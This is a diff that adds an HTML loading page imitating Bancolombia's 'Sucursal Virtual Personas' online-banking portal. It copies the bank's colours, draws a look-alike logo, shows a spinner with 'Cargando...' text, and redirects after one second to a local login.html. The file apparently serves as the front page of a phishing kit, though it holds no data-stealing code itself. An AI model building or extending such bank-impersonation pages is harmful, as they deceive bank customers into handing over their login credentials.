@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="es-CO">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body {
+    height: 100%;
+    width: 100%;
+    font-family: 'Open Sans', Arial, sans-serif;
+    background: #f9f9fa;
+  }
+  body {
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    transition: opacity 0.6s ease;
+  }
+  body.fade-out {
+    opacity: 0;
+  }
+
+  /* Contenedor principal del loader */
+  .loader-container {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    animation: fadeIn 0.4s ease;
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(10px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  /* Logo Bancolombia */
+  .loader-logo {
+    margin-bottom: 32px;
+  }
+  .loader-logo svg {
+    width: 184px;
+    height: auto;
+  }
+
+  /* Spinner circular estilo Bancolombia */
+  .loader-spinner {
+    width: 48px;
+    height: 48px;
+    border: 4px solid #e8e8e8;
+    border-top-color: #fdda24;
+    border-radius: 50%;
+    animation: spin 0.7s linear infinite;
+    margin-bottom: 24px;
+  }
+
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+
+  /* Texto de carga */
+  .loader-text {
+    font-family: 'Open Sans', Arial, sans-serif;
+    font-weight: 400;
+    font-size: 14px;
+    line-height: 20px;
+    color: #5f5d5c;
+    margin-bottom: 24px;
+  }
+
+  /* Barra de progreso */
+  .loader-progress-bar {
+    width: 200px;
+    height: 4px;
+    background: #e8e8e8;
+    border-radius: 2px;
+    overflow: hidden;
+  }
+  .loader-progress-fill {
+    height: 100%;
+    width: 0%;
+    background: #fdda24;
+    border-radius: 2px;
+    transition: width 0.3s linear;
+  }
+
+  /* Versión del sistema */
+  .loader-version {
+    position: fixed;
+    bottom: 24px;
+    font-family: 'Open Sans', Arial, sans-serif;
+    font-weight: 400;
+    font-size: 12px;
+    color: #b0aeae;
+    text-align: center;
+  }
+
+  @media (max-width: 575px) {
+    .loader-logo svg { width: 150px; }
+  }
+</style>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+<title>Bancolombia Sucursal Virtual Personas</title>
+</head>
+<body>
+
+  <div class="loader-container" id="loaderContainer">
+    <!-- Logo Bancolombia -->
+    <div class="loader-logo">
+      <svg viewBox="0 0 1024 164" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M155.6 50.2C155.6 35.4 145.8 26.6 132 26.6H89.2V73.8H132C145.8 73.8 155.6 65 155.6 50.2Z" fill="#FDDA24"/>
+        <path d="M155.6 113.4C155.6 98.6 145.8 89.8 132 89.8H89.2V137H132C145.8 137 155.6 128.2 155.6 113.4Z" fill="#FDDA24"/>
+        <path d="M50.4 0C22.6 0 0 22.6 0 50.4V113.6C0 141.4 22.6 164 50.4 164H197.2V0H50.4Z" fill="#2C2A29"/>
+        <path d="M256.4 0H212.4V164H256.4V0Z" fill="#2C2A29"/>
+        <path d="M320.4 0H276.4V164H320.4V0Z" fill="#2C2A29"/>
+        <path d="M384.4 0H340.4V164H384.4V0Z" fill="#2C2A29"/>
+        <path d="M448.4 0H404.4V164H448.4V0Z" fill="#2C2A29"/>
+        <path d="M512.4 0H468.4V164H512.4V0Z" fill="#2C2A29"/>
+        <path d="M576.4 0H532.4V164H576.4V0Z" fill="#2C2A29"/>
+        <path d="M640.4 0H596.4V164H640.4V0Z" fill="#2C2A29"/>
+        <path d="M704.4 0H660.4V164H704.4V0Z" fill="#2C2A29"/>
+        <path d="M768.4 0H724.4V164H768.4V0Z" fill="#2C2A29"/>
+        <path d="M832.4 0H788.4V164H832.4V0Z" fill="#2C2A29"/>
+        <path d="M896.4 0H852.4V164H896.4V0Z" fill="#2C2A29"/>
+        <path d="M1024 0H980V164H1024V0Z" fill="#2C2A29"/>
+        <path d="M960.4 0H916.4V164H960.4V0Z" fill="#2C2A29"/>
+        <path d="M183 126.2C183 114.2 193 104.2 205 104.2C217 104.2 227 114.2 227 126.2C227 138.2 217 148.2 205 148.2C193 148.2 183 138.2 183 126.2Z" fill="#FDDA24"/>
+      </svg>
+    </div>
+
+    <!-- Spinner -->
+    <div class="loader-spinner"></div>
+
+    <!-- Texto de carga -->
+    <p class="loader-text">Cargando Sucursal Virtual Personas...</p>
+
+    <!-- Barra de progreso -->
+    <div class="loader-progress-bar">
+      <div class="loader-progress-fill" id="progressFill"></div>
+    </div>
+  </div>
+
+  <p class="loader-version">Versión 1.0.0</p>
+
+  <script>
+    setTimeout(function() {
+      window.location.replace("login.html");
+    }, 1000);
+  </script>
+</body>
+</html>
